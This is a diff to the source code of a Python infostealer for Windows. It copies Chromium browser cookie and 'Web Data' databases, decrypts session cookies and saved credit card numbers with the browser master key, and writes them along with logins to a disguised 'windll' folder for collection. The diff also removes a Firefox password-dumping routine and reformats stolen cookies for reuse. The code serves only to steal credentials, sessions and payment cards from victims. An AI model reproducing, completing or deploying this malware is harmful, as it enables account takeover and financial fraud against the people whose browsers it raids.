@@ -31,7 +31,7 @@ logins = ''''''
 cookies = ''''''
 history = []
 downloads = []
-cards = []
+cards = ''''''
 browsersCounter = -1
 names = [
             'Amigo',
@@ -56,9 +56,8 @@ names = [
 
 class Browsers:
     def __init__(self):
-        listData.append("\n\n🌐Browsers")
+        listData.append("\n**🌐Browsers🌐**")
         Chromium()
-        FireFox()
     def Return():
         return listData
 
@@ -74,7 +73,7 @@ class Upload:
         print(names[browsersCounter])
         if logins:
             if not self.Colected:
-                listData.append("\n"+names[browsersCounter])
+                listData.append("\n🔍"+names[browsersCounter])
             self.Colected = True
             print ("logins")
             with open(rf"{pathf}\windll\Browsers\{names[browsersCounter]}\logins.txt", "w", encoding="utf-8") as f:
@@ -116,31 +115,10 @@ class Upload:
             self.Colected = True
             print("cards")
             with open(rf"{pathf}\windll\Browsers\{names[browsersCounter]}\cards.txt", "w", encoding="utf-8") as f:
-                f.write('\n'.join(str(x) for x in cards))
+                f.write(cards)
             listData.append("\n∟💳cards")
-
-
-class FireFox:
-    def __init__(self):
-        self.Firefox()
-
-    def Firefox(self):
-        try:
-            pathl = environ['USERPROFILE'] + sep + r'AppData\Local'
-            makedirs(rf'{pathl}\windll\Browsers\Firefox', exist_ok=True)
-            mozilla_profile = path.join(getenv('APPDATA'), r'Mozilla\Firefox')
-            mozilla_profile_ini = path.join(mozilla_profile, r'profiles.ini')
-            profile = ConfigParser()
-            profile.read(mozilla_profile_ini)
-            data_path = path.normpath(path.join(mozilla_profile, profile.get('Profile0', 'Path')))
-            subprocesss = Popen("ffpass export -d  " + data_path, shell=True, stdout=PIPE)
-            subprocess_return = subprocesss.stdout.read()
-            passwords = str(subprocess_return)
-            with open(rf'{pathl}\windll\Browsers\Firefox\firefox.txt', "a", encoding="utf-8") as file:
-                file.write(passwords.replace('\\r', '\n'))
-                file.close()
-        except Exception as e:
-            print(e)
+        if self.Colected:
+            listData.append("\n")
 
 class Chromium:
     def __init__(self):
@@ -273,68 +251,28 @@ class Chromium:
     def get_cookies(self, pathl: str, profile: str):
         try:
             global cookies
-            CookiesSQL = "SELECT * FROM cookies"
             if pathl != "\\Opera Software\\Opera GX Stable" or pathl != "\\Opera Software\\Opera Stable":
-                data_path = fr'{pathl}\{profile}\Network'
+                data_path = fr'{pathl}\{profile}\Network\Cookies'
             else:
-                data_path = fr'{pathl}\Network'
-            #files = os.listdir(data_path)
-            history_db = path.join(data_path, 'Cookies')
-            copy2(history_db, environ['USERPROFILE'] + '\\AppData\\Roaming\\cookies.db')# find and copy cookies
-            #shutil.copy2(history_db, os.environ['USERPROFILE'] + 'C:\\windll\\Browsers\\Chrome\\cookies.db')
-            c = connect(environ['USERPROFILE'] + '\\AppData\\Roaming\\cookies.db')
-            cursor = c.cursor()
-            results = '[\n'
-            result = cursor.execute(CookiesSQL).fetchall()
+                data_path = fr'{pathl}\Network\Cookies'
+            if path.exists(data_path):
+                copy(data_path, path.dirname(pathl)+'\\cookie_db')
+                conn = connect(path.dirname(pathl)+'\\cookie_db')
+                cursor = conn.cursor()
+                cursor.execute("SELECT host_key, path, datetime(expires_utc/1000000,'unixepoch') as expires_utc, name, encrypted_value FROM cookies")
+                for row in cursor.fetchall():
+                    if not all(row[:4]):
+                        continue
 
-            """
-            decode cookies
-            """
-            for result in cursor.execute(CookiesSQL).fetchall():
-                if result[8] == 0:
-                    secure = False
-                else:
-                    secure = True
+                    cookie_value = str(self.decrypt(row[4], self.get_master_key_chromium(path)))
 
-                if result[9] == 0:
-                    http = False
-                else:
-                    http = True
-
-                try:
-                    decrypted_value = str(self.decrypt(result[5], self.get_master_key_chromium(path)))
-                except Exception as error:
-                    decrypted_value = str(error)
-
-                results += '''
-                {
-                    "domain": "%s",
-                    "expirationDate": %s,
-                    "name": "%s",
-                    "httpOnly": %s,
-                    "path": "%s",
-                    "secure": %s,
-                    "value": "%s"
-                },
-                ''' % (
-                    str(result[1]),
-                    str(result[7]),
-                    str(result[2]),
-                    str(http),
-                    str(result[6]),
-                    str(secure),
-                    decrypted_value
-                )
+                    cookie_line = f"{row[0]}\tTRUE\t{row[2]}\tFALSE\t{row[4]}\t{row[1]}\t{cookie_value}"
+                    cookies += f"\n\n\n{profile}:\n\n"
+                    cookies += cookie_line + "\n"
         
-            results = results.replace('True', 'true')
-            results = results.replace('False', 'false')
-            results += '\n]'
-            cookies += f"\n\n\n{profile}:\n\n"
-            cookies += results
-            try:
-                remove(environ['USERPROFILE'] + '\\AppData\\Roaming\\cookies.db')# clear all
-            except:
-                pass
+
+                conn.close()
+                remove(path.dirname(pathl)+'\\cookie_db')
         except Exception as error:
             print(error)
     
@@ -425,22 +363,27 @@ class Chromium:
                 cards_db = f'{pathl}\\{profile}\\Web Data'
             else:
                 cards_db = f'{pathl}\\Web Data'
-            if not path.exists(cards_db):
-                return
+    
+            if path.exists(cards_db):
+                copy(cards_db, path.dirname(pathl)+'\\cards_db')
+                conn = connect(path.dirname(pathl)+'\\cards_db')
+                cursor = conn.cursor()
+                cursor.execute('SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards')
+                for row in cursor.fetchall():
+                    if not row[0] or not row[1] or not row[2] or not row[3]:
+                        continue
+                    card_number = self.decrypt_password(row[3], self.master_key)
+                cards += f"\n\n\n{profile}:\n\n"
 
-            copy(cards_db, 'cards_db')
-            conn = connect('cards_db')
-            cursor = conn.cursor()
-            cursor.execute('SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards')
-            for row in cursor.fetchall():
-                if not row[0] or not row[1] or not row[2] or not row[3]:
-                    continue
+                cards += f"""
+Name On Card: {row[0]}
+Card Number: {card_number}
+Expires On:  {row[1]} / {row[2]}
+Added On: {datetime.fromtimestamp(row[4])}
+"""
 
-                card_number = self.decrypt_password(row[3], self.master_key)
-                cards.append(Types.CreditCard(row[0], row[1], row[2], card_number, row[4]))
-
-            conn.close()
-            remove('cards_db')
+                conn.close()
+                remove(path.dirname(pathl)+'\\cards_db')
         except:
             pass
 
@@ -452,20 +395,6 @@ class Types:
 
         def __str__(self):
             return f'{self.tab_url}\t{self.target_path}'
-
-        def __repr__(self):
-            return self.__str__()
-
-    class CreditCard:
-        def __init__(self, name, month, year, number, date_modified):
-            self.name = name
-            self.month = month
-            self.year = year
-            self.number = number
-            self.date_modified = date_modified
-
-        def __str__(self):
-            return f'{self.name}\t{self.month}\t{self.year}\t{self.number}\t{self.date_modified}'
 
         def __repr__(self):
             return self.__str__()
